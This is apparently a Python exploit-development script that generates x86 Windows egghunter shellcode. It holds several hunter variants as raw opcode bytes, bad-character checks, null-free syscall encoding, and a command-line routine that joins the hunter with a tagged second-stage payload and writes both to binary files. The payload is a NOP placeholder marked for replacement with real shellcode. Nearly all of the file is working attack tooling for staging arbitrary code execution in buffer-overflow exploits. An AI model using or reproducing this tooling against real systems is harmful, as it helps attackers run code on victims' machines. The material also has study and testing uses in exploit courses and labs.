#!/usr/bin/env python3
from __future__ import annotations

from pathlib import Path
from typing import Callable, Dict, Tuple


class BadCharError(Exception):
    pass


# ============================================================
# Helpers
# ============================================================


def to_hex(buf: bytes) -> str:
    return "".join(f"\\x{b:02x}" for b in buf)


def write_bin(path: str, data: bytes) -> None:
    Path(path).write_bytes(data)


def check_badchars(buf: bytes, badchars: bytes) -> None:
    bad = set(buf) & set(badchars)
    if bad:
        raise BadCharError(f"Badchars present: {' '.join(f'{b:02x}' for b in bad)}")


# ============================================================
# Egghunter templates (x86)
# ============================================================


def hunter_ntaccess(tag: bytes) -> bytes:
    return (
        b"\x66\x81\xca\xff\x0f"
        b"\x42"
        b"\x52"
        b"\x6a\x02"
        b"\x58"
        b"\xcd\x2e"
        b"\x3c\x05"
        b"\x5a"
        b"\x74\xef"
        b"\xb8" + tag[::-1] + b"\x8b\xfa"
        b"\xaf"
        b"\x75\xea"
        b"\xaf"
        b"\x75\xe7"
        b"\xff\xe7"
    )


def hunter_ntaccess_dynamic(tag: bytes, syscall: int) -> bytes:
    return (
        b"\x66\x81\xca\xff\x0f"
        b"\x42"
        b"\x52" + encode_syscall_no_null(syscall) + b"\xcd\x2e"
        b"\x3c\x05"
        b"\x5a"
        b"\x74\xef"
        b"\xb8" + tag[::-1] + b"\x8b\xfa"
        b"\xaf"
        b"\x75\xea"
        b"\xaf"
        b"\x75\xe7"
        b"\xff\xe7"
    )


def hunter_ntdisplaystring(tag: bytes) -> bytes:
    return (
        b"\x66\x81\xca\xff\x0f"
        b"\x42"
        b"\x52"
        b"\x6a\x43"
        b"\x58"
        b"\xcd\x2e"
        b"\x3c\x05"
        b"\x5a"
        b"\x74\xef"
        b"\xb8" + tag[::-1] + b"\x8b\xfa"
        b"\xaf"
        b"\x75\xea"
        b"\xaf"
        b"\x75\xe7"
        b"\xff\xe7"
    )


def hunter_wow64_ntaccess(tag: bytes) -> bytes:
    return (
        b"\x33\xd2"
        b"\x66\x81\xca\xff\x0f"
        b"\x33\xdb"
        b"\x42"
        b"\x52"
        b"\x53\x53\x53\x53"
        b"\x6a\x29"
        b"\x58"
        b"\xb3\xc0"
        b"\x64\xff\x13"
        b"\x83\xc4\x10"
        b"\x5a"
        b"\x3c\x05"
        b"\x74\xe3"
        b"\xb8" + tag[::-1] + b"\x8b\xfa"
        b"\xaf"
        b"\x75\xde"
        b"\xaf"
        b"\x75\xdb"
        b"\xff\xe7"
    )


# Optional heavier variant
def hunter_seh(tag: bytes) -> bytes:
    return (
        b"\xeb\x21\x59\xb8" + tag + b"\x51\x6a\xff\x33\xdb\x64\x89\x23"
        b"\x6a\x02\x59\x8b\xfb\xf3\xaf"
        b"\x75\x07\xff\xe7"
        b"\x66\x81\xcb\xff\x0f\x43\xeb\xed"
        b"\xe8\xda\xff\xff\xff"
        b"\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8"
        b"\x83\x04\x08\x06\x58\x83\xc4\x10\x50"
        b"\x33\xc0\xc3"
    )


HUNTERS: Dict[str, Callable[[bytes], bytes]] = {
    "ntaccess": hunter_ntaccess,
    "ntdisplaystring": hunter_ntdisplaystring,
    "wow64": hunter_wow64_ntaccess,
    "seh": hunter_seh,
}


# ============================================================
# Core API
# ============================================================


def build_egg(tag: bytes) -> bytes:
    if len(tag) != 4:
        raise ValueError("Tag must be 4 bytes")
    return tag + tag


def choose_hunter(tag: bytes, badchars: bytes) -> Tuple[str, bytes]:
    for name, fn in HUNTERS.items():
        try:
            hunter = fn(tag)
            check_badchars(hunter, badchars)
            return name, hunter
        except BadCharError:
            continue
    raise RuntimeError("No valid egghunter found for given badchars")


def build_all(tag: bytes, payload: bytes, badchars: bytes = b""):
    name, hunter = choose_hunter(tag, badchars)
    egg = build_egg(tag)
    stage2 = egg + payload

    return {
        "variant": name,
        "hunter": hunter,
        "stage2": stage2,
    }


def encode_syscall_no_null(syscall: int) -> bytes:
    """
    Encode syscall ID without NULL bytes using NEG trick.
    Returns opcode sequence.
    """

    neg_val = (0x100000000 - syscall) & 0xFFFFFFFF
    raw = neg_val.to_bytes(4, "little")

    if b"\x00" in raw:
        raise RuntimeError("NEG encoding still contains nulls")

    return b"\xb8" + raw + b"\xf7\xd8"  # mov eax, imm32; neg eax


# ============================================================
# CLI usage
# ============================================================

if __name__ == "__main__":
    tag = b"W00T"
    badchars = b"\x00\x0a\x0d"  # adjust as needed

    # placeholder payload (replace with real shellcode)
    payload = b"\x90" * 100

    result = build_all(tag, payload, badchars)

    print(f"[+] Selected hunter: {result['variant']}")
    print(f"[+] Hunter size: {len(result['hunter'])}")

    print("\nHunter (python):")
    print(f'b"{to_hex(result["hunter"])}"')

    print("\nStage2 (python):")
    print(f'b"{to_hex(result["stage2"][:64])}..."')

    write_bin("hunter.bin", result["hunter"])
    write_bin("stage2.bin", result["stage2"])

    print("\n[+] Wrote hunter.bin and stage2.bin")
